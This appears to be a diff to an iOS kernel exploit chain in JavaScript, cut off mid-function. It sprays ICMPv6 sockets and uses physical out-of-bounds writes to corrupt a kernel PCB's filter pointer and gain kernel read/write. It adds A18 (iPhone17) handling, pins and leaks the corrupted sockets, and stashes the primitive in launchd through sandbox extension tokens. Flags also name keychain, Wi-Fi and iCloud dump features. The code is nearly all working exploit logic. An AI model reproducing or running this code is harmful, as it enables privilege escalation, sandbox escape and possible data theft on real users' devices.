+    early_kwrite64(rw_socket_addr + OFFSET_SOCKET_SO_COUNT,
+                   rw_socket_so_count + KRW_LEAK_DELTA);
+    early_kwrite64(rw_socket_pcb + ICMP6FILT_OFFSET + 0x8n, 0n);
+    krw_socket_pin_active = true;
+    krw_persist_log("socket-pin-writes-done", "control_count_before=" + control_socket_so_count.hex() +
+        " control_count_after=" + (control_socket_so_count + KRW_LEAK_DELTA).hex() +
+        " rw_count_before=" + rw_socket_so_count.hex() +
+        " rw_count_after=" + (rw_socket_so_count + KRW_LEAK_DELTA).hex() +
+        " rw_filter_next_cleared=1");
+    release_pending_krw_socket_ports();
+    LOG("[KRW-STASH] Lara-style socket pin active");
+    krw_persist_log("socket-pin-active");
+  }
   function spray_socket(socket_ports, socket_pcb_ids) {
+    if (is_a18_devices) {
+      pthread_set_qos_class_self_np(QOS_CLASS_BACKGROUND, 0n);
+    }
     let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+    if (is_a18_devices) {
+      pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0n);
+    }
     if (fd == 0xFFFFFFFFFFFFFFFFn) {
       LOG("[-] socket create failed!!!");
       return fd;
@@ -1198,12 +1770,46 @@
     return output_socket_port;
   }
   function sockets_release() {
-    while (socket_ports.length > 0) {
-      let port = socket_ports.pop();
-      if (port != undefined && port != 0n) {
-        try { mach_port_deallocate(mach_task_self(), port); } catch (_) {}
+    if (is_a18_devices) {
+      for (let sock_idx = 0; sock_idx < socket_ports.length; sock_idx++) {
+        let port = socket_ports[sock_idx];
+        if (port != undefined && port != 0n) {
+          if (pending_krw_socket_ports.includes(port)) {
+            LOG("[KRW-STASH] retaining selected socket fileport until pin");
+            continue;
+          }
+          if (unsafe_a18_socket_ports.includes(port)) {
+            LOG("[PE-A18] retaining unsafe rejected-pair fileport for manual reboot");
+            continue;
+          }
+          if (LS_RETAIN_KRW_FOR_VISIBLE_TEST && retained_socket_ports.includes(port)) {
+            LOG("[PE-TEST] retaining socket fileport " + port.hex());
+            continue;
+          }
+          try { mach_port_deallocate(mach_task_self(), port); } catch (_) {}
+        }
+      }
+    } else {
+      while (socket_ports.length > 0) {
+        let port = socket_ports.pop();
+        if (port != undefined && port != 0n) {
+          if (pending_krw_socket_ports.includes(port)) {
+            LOG("[KRW-STASH] retaining selected socket fileport until pin");
+            continue;
+          }
+          if (unsafe_a18_socket_ports.includes(port)) {
+            LOG("[PE-A18] retaining unsafe rejected-pair fileport for manual reboot");
+            continue;
+          }
+          if (LS_RETAIN_KRW_FOR_VISIBLE_TEST && retained_socket_ports.includes(port)) {
+            LOG("[PE-TEST] retaining socket fileport " + port.hex());
+            continue;
+          }
+          try { mach_port_deallocate(mach_task_self(), port); } catch (_) {}
+        }
       }
     }
+    socket_ports = [];
     socket_pcb_ids = [];
     socket_ports_count = 0n;
   }
@@ -1271,9 +1877,10 @@
     pc_address = new_bigint();
     pc_size = 0n;
 
-    if (pc_object != 0n) {
-      try { mach_port_deallocate(mach_task_self(), pc_object); } catch (_) {}
-    }
+    // new_bigint() creates an output holder with the sentinel value 0x3333.
+    // It is not a Mach port until create_physically_contiguous_mapping()
+    // overwrites it. Deallocating the fresh holder causes EXC_GUARD.
+    LOG("[PE-CLEAN] reset fresh pc_object holder without deallocation: " + pc_object.hex());
     pc_object = new_bigint();
 
     if (read_fd > 0n && read_fd != 0xFFFFFFFFFFFFFFFFn) {
@@ -1327,11 +1934,39 @@
     race_sync_ptr = 0n;
     control_socket_pcb = 0n;
     rw_socket_pcb = 0n;
+    krw_socket_pin_active = false;
+    krw_recovered_from_launchd = false;
+    krw_stash_verified = false;
+    krw_pin_control_socket_addr = 0n;
+    krw_pin_rw_socket_addr = 0n;
+    krw_pin_control_socket_count = 0n;
+    krw_pin_rw_socket_count = 0n;
     krw_restore_snapshot_clear();
     krw_terminal_cleanup_started = false;
     memset(control_data, 0n, EARLY_KRW_LENGTH);
 
     LOG("[PE-CLEAN] preflight cleanup done");
+  }
+  function restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
+                                       pcb_start_offset, icmp6filt_offset,
+                                       original_filter, original_cksum) {
+    for (let attempt = 0; attempt < 8; attempt++) {
+      memcpy(write_buffer, read_buffer, oob_size);
+      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset, original_filter);
+      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset + 0x8n, original_cksum);
+      physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
+      if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) != KERN_SUCCESS) {
+        continue;
+      }
+      let restored_filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
+      let restored_cksum = uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n);
+      if (restored_filter == original_filter && restored_cksum == original_cksum) {
+        LOG("[PE-A18] restored rejected control filter before socket release");
+        return true;
+      }
+    }
+    LOG("[PE-A18] failed to restore rejected control filter");
+    return false;
   }
   function find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, do_read = true) {
     if (do_read == true) {
@@ -1344,19 +1979,67 @@
     let target_found = false;
     let pcb_start_offset = 0n;
     let icmp6filt_offset = 0x148n;
-    let found = 0n;
-    do {
-      found = memmem(read_buffer + search_start_idx, oob_size - search_start_idx, executable_name, strlen(executable_name));
-      if (found != 0n) {
-        pcb_start_offset = found - read_buffer & 0xFFFFFFFFFFFFFC00n;
-        if (uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n) == 0x0000ffffffffffffn) {
-          target_found = true;
-          break;
+    let matched_marker = "";
+    if (is_a18_devices) {
+      // Match Lara's A18 finder. Locate the closest process marker first,
+      // then reverse-search for the ICMPv6 filter sentinel to derive the
+      // exact PCB base. Do not guess the base with 0x400-byte alignment.
+      let corrupted_filter_marker = new_uint64_t(0x0000ffffffffffffn);
+      try {
+        while (search_start_idx < oob_size) {
+          let best_found = 0n;
+          let best_marker = "";
+          for (let marker_idx = 0; marker_idx < process_markers.length; marker_idx++) {
+            let marker = process_markers[marker_idx];
+            let candidate = memmem(read_buffer + search_start_idx,
+                                   oob_size - search_start_idx,
+                                   marker.pointer,
+                                   marker.length);
+            if (candidate != 0n && (best_found == 0n || candidate < best_found)) {
+              best_found = candidate;
+              best_marker = marker.name;
+            }
+          }
+          if (best_found == 0n) break;
+
+          let found_offset = best_found - read_buffer;
+          let filter_found = reverse_memmem(read_buffer,
+                                            found_offset,
+                                            corrupted_filter_marker,
+                                            8n);
+          if (filter_found != 0n) {
+            let filter_offset = filter_found - read_buffer;
+            if (filter_offset >= icmp6filt_offset + 0x8n) {
+              let candidate_pcb_start_offset = filter_offset - (icmp6filt_offset + 0x8n);
+              if (candidate_pcb_start_offset + icmp6filt_offset + 0x10n <= oob_size) {
+                pcb_start_offset = candidate_pcb_start_offset;
+                matched_marker = best_marker;
+                target_found = true;
+                break;
+              }
+            }
+          }
+          search_start_idx = found_offset + 1n;
         }
+      } finally {
+        free(corrupted_filter_marker);
       }
-      search_start_idx += 0x400n;
-    } while (found != 0n && search_start_idx < oob_size);
+    } else {
+      let found = 0n;
+      do {
+        found = memmem(read_buffer + search_start_idx, oob_size - search_start_idx, executable_name, strlen(executable_name));
+        if (found != 0n) {
+          pcb_start_offset = found - read_buffer & 0xFFFFFFFFFFFFFC00n;
+          if (uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n) == 0x0000ffffffffffffn) {
+            target_found = true;
+            break;
+          }
+        }
+        search_start_idx += 0x400n;
+      } while (found != 0n && search_start_idx < oob_size);
+    }
     if (target_found == true) {
+      if (matched_marker) LOG("[PE-A18] matched PCB via process marker: " + matched_marker);
       LOG("[+] pcb_start_offset: " + pcb_start_offset.hex());
       let target_inp_gencnt = uread64(read_buffer + pcb_start_offset + 0x78n);
       LOG("[+] target_inp_gencnt: " + target_inp_gencnt.hex());
@@ -1389,16 +2072,34 @@
       }
       let rw_inp_gencnt = socket_pcb_ids[control_socket_idx + 0x1n];
       let rw_snapshot_found = false;
+      let rw_snapshot_offset = -1n;
       let rw_orig_filter = 0n;
       let rw_orig_cksum = 0n;
-      for (let off = 0n; off + icmp6filt_offset + 0x8n < oob_size; off += 0x400n) {
-        if (off + 0x78n + 0x8n > oob_size) continue;
-        let candidate_gencnt = uread64(read_buffer + off + 0x78n);
-        if (candidate_gencnt != rw_inp_gencnt) continue;
-        rw_orig_filter = uread64(read_buffer + off + icmp6filt_offset);
-        rw_orig_cksum = uread64(read_buffer + off + icmp6filt_offset + 0x8n);
-        rw_snapshot_found = true;
-        break;
+      let rw_gencnt_data = new_uint64_t(rw_inp_gencnt);
+      try {
+        let rw_search_offset = 0n;
+        while (rw_search_offset + 8n <= oob_size) {
+          let rw_gencnt_found = memmem(read_buffer + rw_search_offset,
+                                       oob_size - rw_search_offset,
+                                       rw_gencnt_data,
+                                       8n);
+          if (rw_gencnt_found == 0n) break;
+          let gencnt_offset = rw_gencnt_found - read_buffer;
+          if (gencnt_offset >= 0x78n) {
+            let candidate_offset = gencnt_offset - 0x78n;
+            if (candidate_offset + icmp6filt_offset + 0x10n <= oob_size &&
+                uread64(read_buffer + candidate_offset + icmp6filt_offset + 0x8n) == 0x0000ffffffffffffn) {
+              rw_orig_filter = uread64(read_buffer + candidate_offset + icmp6filt_offset);
+              rw_orig_cksum = uread64(read_buffer + candidate_offset + icmp6filt_offset + 0x8n);
+              rw_snapshot_offset = candidate_offset;
+              rw_snapshot_found = true;
+              break;
+            }
+          }
+          rw_search_offset = gencnt_offset + 1n;
+        }
+      } finally {
+        free(rw_gencnt_data);
       }
       let inp_list_next_pointer = uread64(read_buffer + pcb_start_offset + 0x28n) - 0x20n;
       let icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
@@ -1406,20 +2107,47 @@
       LOG("[+] inp_list_next_pointer: " + inp_list_next_pointer.hex());
       LOG("[+] icmp6filter: " + icmp6filter.hex());
       if (rw_snapshot_found) {
-        krw_restore_snapshot_note(icmp6filter, control_orig_cksum, rw_orig_filter, rw_orig_cksum);
+        if (is_a18_devices) {
+          let rw_list_next = uread64(read_buffer + rw_snapshot_offset + 0x20n);
+          let page_mask = PAGE_SIZE - 1n;
+          let pair_matches = is_kernel_pointer(inp_list_next_pointer) &&
+            is_kernel_pointer(rw_list_next) &&
+            (inp_list_next_pointer & page_mask) == (rw_snapshot_offset & page_mask) &&
+            (rw_list_next & page_mask) == (pcb_start_offset & page_mask);
+          if (!pair_matches) {
+            LOG("[PE-A18] rejecting non-adjacent PCB pair control_off=" + pcb_start_offset.hex() +
+                " rw_off=" + rw_snapshot_offset.hex() +
+                " list_prev=" + inp_list_next_pointer.hex() +
+                " rw_list_next=" + rw_list_next.hex());
+            return -1n;
+          }
+          LOG("[PE-A18] verified adjacent control/rw PCB list pair");
+        }
+        let snapshot_saved = krw_restore_snapshot_note(icmp6filter, control_orig_cksum, rw_orig_filter, rw_orig_cksum);
+        if (is_a18_devices && !snapshot_saved) {
+          LOG("[PE-A18] rejecting PCB pair without valid filter snapshots");
+          return -1n;
+        }
       } else {
         krw_restore_snapshot_clear();
         LOG("[KRW-CLEAN] restore snapshot unavailable: rw PCB not in OOB window");
+        if (is_a18_devices) {
+          LOG("[PE-A18] rejecting PCB pair without a restorable neighboring filter");
+          return -1n;
+        }
       }
       rw_socket_pcb = BigInt(inp_list_next_pointer);
       memcpy(write_buffer, read_buffer, oob_size);
       uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset, inp_list_next_pointer + icmp6filt_offset);
       uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset + 0x8n, 0n);
+      let selected_control_port = socket_ports[control_socket_idx];
+      let selected_rw_port = socket_ports[control_socket_idx + 0x1n];
       LOG("[+] Corrupting icmp6filter pointer...");
       while (true) {
         physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
         if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) != KERN_SUCCESS) {
           LOG("[-] find_and_corrupt_socket: re-read after corruption failed");
+          if (is_a18_devices) return mark_a18_cleanup_unsafe(selected_control_port);
           return -1n;
         }
         let new_icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
@@ -1428,20 +2156,67 @@
           break;
         }
       }
-      let sock = fileport_makefd(socket_ports[control_socket_idx]);
+      let sock = fileport_makefd(selected_control_port);
+      if (native_result_is_negative(sock)) {
+        LOG("[PE] control fileport_makefd failed");
+        let restored = !is_a18_devices ||
+          restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
+                                      pcb_start_offset, icmp6filt_offset,
+                                      icmp6filter, control_orig_cksum);
+        if (!restored) {
+          return mark_a18_cleanup_unsafe(selected_control_port);
+        }
+        return -1n;
+      }
       let res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, get_bigint_addr(getsockopt_read_length));
       if (res != 0n) {
-        LOG("[-] getsockopt failed!!!");
-        exit(0n);
+        LOG("[-] getsockopt failed during control pair check");
+        let restored = !is_a18_devices ||
+          restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
+                                      pcb_start_offset, icmp6filt_offset,
+                                      icmp6filter, control_orig_cksum);
+        if (restored) close(sock);
+        else return mark_a18_cleanup_unsafe(selected_control_port);
+        return -1n;
       }
       let marker = uread64(getsockopt_read_data);
       if (marker != 0xffffffffffffffffn) {
+        let candidate_rw_socket = fileport_makefd(selected_rw_port);
+        if (native_result_is_negative(candidate_rw_socket)) {
+          LOG("[PE] rw fileport_makefd failed");
+          let restored = !is_a18_devices ||
+            restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
+                                        pcb_start_offset, icmp6filt_offset,
+                                        icmp6filter, control_orig_cksum);
+          if (restored) close(sock);
+          else return mark_a18_cleanup_unsafe(selected_control_port);
+          return -1n;
+        }
         LOG("[+] Found control_socket at idx: " + control_socket_idx.hex());
         control_socket = sock;
-        rw_socket = fileport_makefd(socket_ports[control_socket_idx + 0x1n]);
+        rw_socket = candidate_rw_socket;
+        pending_krw_socket_ports = [selected_control_port, selected_rw_port];
+        LOG("[KRW-STASH] selected socket fileports retained until Lara-style pin");
+        if (LS_RETAIN_KRW_FOR_VISIBLE_TEST) {
+          retained_socket_ports = [
+            selected_control_port,
+            selected_rw_port
+          ];
+          LOG("[PE-TEST] selected control/rw fileports retained: " +
+              retained_socket_ports[0].hex() + ", " + retained_socket_ports[1].hex());
+        }
         return KERN_SUCCESS;
       } else {
         LOG("[-] Failed to corrupt control_socket at idx: " + control_socket_idx.hex());
+        if (is_a18_devices) {
+          let restored = restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
+                                                      pcb_start_offset, icmp6filt_offset,
+                                                      icmp6filter, control_orig_cksum);
+          if (restored) close(sock);
+          else return mark_a18_cleanup_unsafe(selected_control_port);
+        } else {
+          close(sock);
+        }
       }
     }
     return -1n;
@@ -1535,9 +2310,13 @@
         while (seeking_offset < search_mapping_size) {
           kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
           if (kr == KERN_SUCCESS) {
-            if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
+            let find_result = find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false);
+            if (find_result == KERN_SUCCESS) {
               success = true;
               break;
+            }
+            if (find_result == PE_A18_CLEANUP_UNSAFE) {
+              throw new Error("A18 rejected-pair restoration failed; manual reboot required");
             }
           }
           seeking_offset += PAGE_SIZE;
@@ -1551,7 +2330,9 @@
           break;
         }
       }
+      LOG("[PE-TEST] releasing socket spray; selected fileports will be retained");
       sockets_release();
+      LOG("[PE-TEST] socket spray release complete");
       for (let s = 0n; s < n_of_search_mappings; s++) {
         let search_mapping_address = search_mappings.pop();
         surface_munlock(search_mapping_address, search_mapping_size);
@@ -1663,10 +2444,13 @@
               socket_ports_count++;
             }
           }
-          if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, true) == KERN_SUCCESS) {
+          let find_result = find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, true);
+          if (find_result == KERN_SUCCESS) {
             LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Reallocated PCB page`);
             success = true;
             break;
+          } else if (find_result == PE_A18_CLEANUP_UNSAFE) {
+            throw new Error("A18 rejected-pair restoration failed; manual reboot required");
           } else {
             if (socket_ports_count >= max_sockets_count) {
               sockets_release();
@@ -1675,11 +2459,16 @@
             }
             seeking_offset = 0n;
           }
-        } else if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
-          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found PCB page`);
-          success = true;
-          break;
         } else {
+          let find_result = find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false);
+          if (find_result == KERN_SUCCESS) {
+            LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found PCB page`);
+            success = true;
+            break;
+          }
+          if (find_result == PE_A18_CLEANUP_UNSAFE) {
+            throw new Error("A18 rejected-pair restoration failed; manual reboot required");
+          }
           seeking_offset += PAGE_SIZE;
         }
       }
@@ -1688,8 +2477,13 @@
         LOG("[-] mach_port_deallocate failed!!!");
         exit(0n);
       }
+      LOG("[PE-TEST] releasing PE v2 socket spray; retain=" +
+          (LS_RETAIN_KRW_FOR_VISIBLE_TEST ? "true" : "false"));
       sockets_release();
-      surface_munlock(search_mapping_address, search_mapping_size);
+      LOG("[PE-TEST] PE v2 socket spray release complete");
+      if (!is_a18_devices) {
+        surface_munlock(search_mapping_address, search_mapping_size);
+      }
       kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
       if (success == true) {
         break;
@@ -1699,19 +2493,32 @@
       let wired_page = wired_mapping_entries_addresses[i];
       mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
     }
-    surface_munlock_all();
+    if (!is_a18_devices) {
+      surface_munlock_all();
+    } else {
+      LOG("[PE-A18] preserved IOSurface locks to match Lara pe_a18");
+    }
   }
   function pe() {
     LOG("[PE-DBG] pe() entered");
-    pe_preflight_cleanup();
     let device_machine = get_device_machine();
     LOG("[PE-DBG] device_machine ptr: " + device_machine.hex());
     let a18_prefix_cmp = strncmp(device_machine, get_cstring("iPhone17,"), 9n);
     LOG("[PE-DBG] iPhone17 prefix cmp: " + fmt(a18_prefix_cmp));
+    is_a18_devices = a18_prefix_cmp == 0n;
+    if (globalThis.__ls_run_mode !== "cleanup") {
+      if (krw_recover_from_launchd()) {
+        krw_persist_log("acquisition-path", "path=same-boot-recovery");
+        return true;
+      }
+      krw_persist_log("acquisition-path", "path=full-chain");
+    } else {
+      krw_persist_log("acquisition-path", "path=cleanup-only");
+    }
+    pe_preflight_cleanup();
     if (a18_prefix_cmp == 0n) {
       LOG("[PE-DBG] A18 branch selected");
       LOG("[+] Running on A18 Devices");
-      is_a18_devices = true;
       LOG("[PE-DBG] A18 settle sleep begin");
       sleep(8n);
       LOG("[PE-DBG] A18 settle sleep done; calling pe_init()");
@@ -1751,6 +2558,7 @@
       krw_terminal_cleanup("cleanup-only mode");
       return true;
     }
+    krw_sockets_leak_forever();
     return true;
   }
   mpd_js_thread_spawn = js_thread_spawn;
@@ -1770,6 +2578,19 @@
   mpd_kernel_base = function () {
     return kernel_base;
   };
+  mpd_krw_was_recovered = function () {
+    return krw_recovered_from_launchd;
+  };
+  mpd_krw_mark_stash_verified = function () {
+    krw_stash_verified = true;
+  };
+  mpd_krw_probe_pair = krw_probe_socket_pair;
+  mpd_krw_current_identity = krw_current_identity;
+  mpd_krw_write_stash_record = krw_write_stash_record;
+  mpd_krw_stash_scheme = function () { return KRW_STASH_SCHEME; };
+  mpd_krw_stash_version = function () { return KRW_STASH_VERSION; };
+  mpd_krw_mach_register_class = function () { return KRW_MACH_REGISTER; };
+  mpd_krw_mach_lookup_class = function () { return KRW_MACH_LOOKUP; };
   // Optional beacon for pe_main.js lifecycle diagnostics.
   let CONNECT = func_resolve("connect");
   function sendBeacon(stage) {
@@ -1790,13 +2611,15 @@
       free(addr);
     } catch(e) {}
   }
-  LOG("[PE-DBG] pe_main entry; debug_network=" + PE_ENABLE_DEBUG_NETWORK);
+  LOG("[PE-DBG] pe_main entry; revision=" + LS_PE_PAYLOAD_REVISION + " debug_network=" + PE_ENABLE_DEBUG_NETWORK);
   peAck(0x1003n);
   sendBeacon("pe_start");
   try {
     LOG("[PE] Calling pe() - kernel exploit phase...");
     pe();
     LOG("[PE] pe() completed");
+    krw_persist_log("pe-returned");
+    if (krw_socket_pin_active) krw_begin_provider_hold("KRW acquired");
   } catch (e) {
     LOG("[PE-ERR] pe() exception: " + String(e));
     try {
@@ -2408,17 +3231,21 @@ class Chain
 		console.log(TAG, "rwSocket: " + rwSocket);
 
 		let portPtr = Native.mem;
-		Native.callSymbol("fileport_makeport", controlSocket, portPtr);
+		Native.write32(portPtr, 0);
+		let controlMakePortResult = Native.callSymbol("fileport_makeport", controlSocket, portPtr);
 		let controlPort = Native.read32(portPtr);
 
-		Native.callSymbol("fileport_makeport", rwSocket, portPtr);
+		Native.write32(portPtr, 0);
+		let rwMakePortResult = Native.callSymbol("fileport_makeport", rwSocket, portPtr);
 		let rwPort = Native.read32(portPtr);
 
 		return {
 			controlPort: controlPort,
 			rwPort: rwPort,
 			controlSocket: controlSocket,
-			rwSocket: rwSocket
+			rwSocket: rwSocket,
+			controlMakePortResult: controlMakePortResult,
+			rwMakePortResult: rwMakePortResult
 		};
 	}
 
@@ -6935,11 +7762,13 @@ class Sandbox {
 		this.#launchdTask = launchdTask;
 	}
 
-	static getTokenForPath(path, consume=false)
+	static getTokenForPath(path, consume=false, tokenMaxSize=512)
 	{
 
 		if (!this.#launchdTask || !this.#launchdTask.success())
 			return;
+		if (!Number.isInteger(tokenMaxSize) || tokenMaxSize < 512 || tokenMaxSize > 0x4000)
+			return null;
 
 		//console.log(TAG,`Creating token for path:${path}`);
 		let memRemote = this.#launchdTask.mem();
@@ -6953,12 +7782,25 @@ class Sandbox {
 			console.log(TAG, "Unable to create token for: " + path);
 			return null;
 		}
+		let tokenCopyRemote = 0n;
+		if (tokenMaxSize > 512) {
+			tokenCopyRemote = this.#launchdTask.call(100, "calloc", 1n, BigInt(tokenMaxSize));
+			if (!tokenCopyRemote) return null;
+			let tokenLength = this.#launchdTask.call(100, "strlcpy", tokenCopyRemote, tokenRemote, BigInt(tokenMaxSize));
+			if (Number(tokenLength) < 0 || Number(tokenLength) >= tokenMaxSize) {
+				this.#launchdTask.call(100, "free", tokenCopyRemote);
+				return null;
+			}
+			tokenRemote = tokenCopyRemote;
+		}
 		//console.log(TAG,`token:${Utils.hex(tokenRemote)}`);
 		let token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
-		this.#launchdTask.read(tokenRemote,token,512n);
+		let tokenRead = this.#launchdTask.read(tokenRemote,token,BigInt(tokenMaxSize));
+		if (tokenCopyRemote) this.#launchdTask.call(100, "free", tokenCopyRemote);
+		if (!tokenRead) return null;
 		if(consume)
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume",token);
-		token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].readString(token,512);
+		token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].readString(token,tokenMaxSize);
 		//console.log(TAG,`token:${token}`);
 		if(!token || !token.includes("com.apple.app-sandbox.read-write"))
 		{
@@ -8835,6 +9677,7 @@ const ENABLE_POWERCUFF_TWEAK = !!globalThis.__ls_enable_powercuff;
 const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
 const POWERCUFF_TWEAK_LABEL = "Powercuff";
 const ENABLE_MGPATCHER = !!globalThis.__ls_enable_mgpatcher;
+const ENABLE_OTA_DISABLED_EXPORT = globalThis.__ls_export_ota_disabled === true;
 const MG_FLAGS = (typeof globalThis.__mg_flags === 'string') ? globalThis.__mg_flags : '';
 const MG_UNFLAGS = (typeof globalThis.__mg_unflags === 'string') ? globalThis.__mg_unflags : '';
 const ENABLE_APPLIMIT_REQUESTED = !!globalThis.__ls_enable_applimit;
@@ -8850,14 +9693,223 @@ const ENABLE_KEYCHAIN_DUMP = false;
 const ENABLE_WIFI_DUMP = false;
 const ENABLE_ICLOUD_DUMP = false;
 const ENABLE_DUMP_COPYOUT = false;
-const ENABLE_SAFARI_ORIGIN_AUDIT = true;
-const ENABLE_SAFARI_ORIGIN_DELETE = true;
-const ENABLE_SAFARI_KILL_AFTER_CLEAN = true;
+const ENABLE_SAFARI_ORIGIN_AUDIT = false;
+const ENABLE_SAFARI_ORIGIN_DELETE = false;
+const ENABLE_SAFARI_KILL_AFTER_CLEAN = false;
+const ENABLE_KRW_STASH = true;
+const KRW_STASH_TOKEN_MAX = 2048;
+
+function krwStashHex(value) {
+	return "0x" + BigInt(value).toString(16);
+}
+
+function krwStashPortValid(port) {
+	return Number(port) > 0 && Number(port) <= 0xffffffff;
+}
+
+function krwStashFdValid(fd) {
+	return Number(fd) > 0;
+}
+
+function krwStashIssueMachToken(launchdTask, tokenClass, serviceName) {
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	let remoteMem = launchdTask.mem();
+	if (!launchdTask.writeStr(remoteMem, tokenClass) ||
+		!launchdTask.writeStr(remoteMem + 0x100n, serviceName)) return null;
+	let tokenRemote = launchdTask.call(10000, "sandbox_extension_issue_mach",
+		remoteMem, remoteMem + 0x100n, 0n);
+	if (!tokenRemote) return null;
+	let tokenCopy = launchdTask.call(10000, "strcpy", remoteMem + 0x200n, tokenRemote);
+	if (!tokenCopy) return null;
+	Native.callSymbol("memset", Native.mem, 0n, BigInt(KRW_STASH_TOKEN_MAX));
+	if (!launchdTask.read(remoteMem + 0x200n, Native.mem, BigInt(KRW_STASH_TOKEN_MAX))) return null;
+	let token = Native.readString(Native.mem, KRW_STASH_TOKEN_MAX);
+	if (!token || token.length > KRW_STASH_TOKEN_MAX || !token.includes(tokenClass)) return null;
+	return token;
+}
+
+function krwStashConsumeToken(token) {
+	if (!token) return false;
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	return Number(Native.callSymbol("sandbox_extension_consume", token)) >= 1;
+}
+
+function krwStashBootstrapPort() {
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	let out = Native.mem + 0x3000n;
+	Native.write32(out, 0);
+	let ret = Native.callSymbol("task_get_special_port", 0x203n, 4n, out);
+	if (Number(ret) !== 0) return 0;
+	return Native.read32(out);
+}
+
+function krwStashLookup(bootstrapPort, serviceName) {
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	let out = Native.mem + 0x3000n;
+	Native.write32(out, 0);
+	let ret = Native.callSymbol("bootstrap_look_up", bootstrapPort, serviceName, out);
+	if (Number(ret) !== 0) return 0;
+	return Native.read32(out);
+}
+
+function krwStashDeallocatePort(port) {
+	if (!krwStashPortValid(port)) return;
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	try { Native.callSymbol("mach_port_deallocate", 0x203n, port); } catch (_) {}
+}
+
+function krwStashUnregister(bootstrapPort, serviceName) {
+	if (!bootstrapPort || !serviceName) return;
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	try { Native.callSymbol("bootstrap_unregister", bootstrapPort, serviceName); } catch (_) {}
+}
+
+function stashKRWToLaunchd(launchdTask) {
+		const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+		const Chain = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"];
+		krw_persist_log("handoff-start", "enabled=" + (ENABLE_KRW_STASH ? "1" : "0"));
+		if (!ENABLE_KRW_STASH) {
+			krw_persist_log("handoff-skipped", "reason=disabled");
+			return false;
+		}
+		if (mpd_krw_was_recovered()) {
+			LOG("[KRW-STASH] recovered primitive already active");
+			krw_persist_log("handoff-skipped", "reason=already-recovered");
+			return true;
+		}
+
+	let rwContext = null;
+	let bootstrapPort = 0;
+	let controlName = "";
+	let rwName = "";
+	let controlRegisterToken = null;
+	let rwRegisterToken = null;
+	let registeredControl = false;
+	let registeredRW = false;
+	let controlLookupPort = 0;
+	let rwLookupPort = 0;
+	let controlProbeFd = -1;
+	let rwProbeFd = -1;
+	let success = false;
+		try {
+			let identity = mpd_krw_current_identity();
+			if (!identity.bootId || !identity.model || !identity.build) {
+				throw new Error("device identity unavailable");
+			}
+			krw_persist_log("handoff-identity-ready", "model=" + identity.model + " build=" + identity.build);
+			let random = Number(Native.callSymbol("arc4random")) >>> 0;
+		let suffix = identity.bootId.replace(/[^A-Za-z0-9._-]/g, "-") + "." +
+			Date.now().toString(36) + "." + random.toString(16);
+		controlName = "com.0xjohnny.lightsaber.krw.c." + suffix;
+		rwName = "com.0xjohnny.lightsaber.krw.r." + suffix;
+		if (controlName.length > 127 || rwName.length > 127) throw new Error("service name too long");
+
+		rwContext = Chain.transferRW();
+			if (!rwContext || Number(rwContext.controlMakePortResult) !== 0 ||
+				Number(rwContext.rwMakePortResult) !== 0 ||
+				!krwStashPortValid(rwContext.controlPort) || !krwStashPortValid(rwContext.rwPort)) {
